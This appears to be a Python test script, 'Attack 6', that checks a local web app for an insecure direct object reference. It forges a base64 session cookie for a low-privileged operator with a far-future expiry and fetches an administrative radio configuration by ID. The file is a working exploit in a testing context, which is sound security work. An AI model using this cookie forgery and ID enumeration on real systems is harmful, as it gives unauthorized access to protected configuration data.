#!/usr/bin/env python3
"""Attack 6: Insecure Direct Object Reference (IDOR).

Reads administrative radio configuration entries using a lower-privileged operator session.
"""

import base64

import requests

BASE_URL = "http://localhost:5000"


def test_attack_6():
    print("[+] Running Individual Attack 6: IDOR on Radio Configuration...")
    target_id = 1
    url = f"{BASE_URL}/api/config/radio/{target_id}"
    token = base64.b64encode(b"operator:operator:9999999999").decode("utf-8")
    cookies = {"session_token": token}
    try:
        response = requests.get(url, cookies=cookies, timeout=5)
        print(f"[*] GET {url} - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] IDOR vulnerability confirmed! Retrieved configuration:")
            print(response.json())
        else:
            print(f"[!] Access denied: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_6()
